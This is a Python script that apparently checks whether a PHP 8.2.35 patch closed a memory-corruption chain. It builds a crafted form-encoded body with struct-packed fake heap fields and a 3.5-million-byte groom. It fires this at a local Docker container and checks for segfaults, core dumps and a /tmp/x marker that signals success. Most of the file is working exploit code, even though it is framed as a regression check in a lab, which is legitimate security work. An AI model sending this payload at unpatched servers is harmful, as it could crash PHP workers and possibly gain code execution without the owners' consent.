#!/usr/bin/env python3
"""oom142: verify php:8.2.35-apache really killed the CVE-2026-109618/109619 chain.
Fires the exact winning groom (measure body: SIG8@v+72, VLEN=295, N=3500000)
at php_vuln35 (8084). Old behavior (8.2.34): 'tried to allocate 3500032' fatal,
worker segfault in shutdown walk, core dumped. Patched behavior: fatal shape
changes (abort before insert), no capture, no segv, no /tmp/x.
"""
import struct, subprocess, urllib.request, time, sys

HOST = "http://127.0.0.1:8084"
N = 3500000
VLEN = 295
SIG8 = struct.pack("<Q", 0x51E2C0DE51E2C0DE)

def build_body():
    # identical to oom141.build_value measure layout (core-decoded geometry)
    v = bytearray(b"\xde" * VLEN)
    v[72:80] = SIG8
    struct.pack_into("<I", v, 80, 0x0106)
    struct.pack_into("<QQ", v, 88, 0, 0)
    return b"=" + bytes(v) + b"&a=1&" + b"Z" * N + b"[x]=1"

def fire(body):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return r.status, r.read(600)
    except Exception as e:
        return -1, ("ERR " + str(e)[:160]).encode()

def logs_tail():
    r = subprocess.run(["docker", "logs", "--tail", "30", "php_vuln35"],
                       capture_output=True, timeout=60)
    return (r.stdout + r.stderr).decode("latin1", "replace")

def x_state():
    r = subprocess.run(["docker", "exec", "php_vuln35", "test", "-f", "/tmp/x"],
                       capture_output=True)
    if r.returncode == 0:
        r2 = subprocess.run(["docker", "exec", "php_vuln35", "cat", "/tmp/x"],
                            capture_output=True, timeout=15)
        return "X_EXISTS:" + r2.stdout.decode("latin1", "replace").strip()
    return "NO_X"

def core_state():
    r = subprocess.run(["docker", "exec", "php_vuln35", "sh", "-c",
                        "ls -la /tmp/core* /tmp/core 2>/dev/null | wc -l"],
                       capture_output=True, timeout=15)
    return r.stdout.decode().strip()

if __name__ == "__main__":
    body = build_body()
    print("body len:", len(body), "N:", N, flush=True)
    for t in range(3):
        c, b = fire(body)
        print("try%d: http=%d" % (t, c), flush=True)
        print("  body[:220]:", b[:220], flush=True)
        print("  segv markers:", [l for l in logs_tail().splitlines()
                                   if "egmentation" in l or "signal" in l.lower()][-2:], flush=True)
        print("  cores:", core_state(), flush=True)
        print("  x:", x_state(), flush=True)
        time.sleep(2)
    print("=== done ===", flush=True)
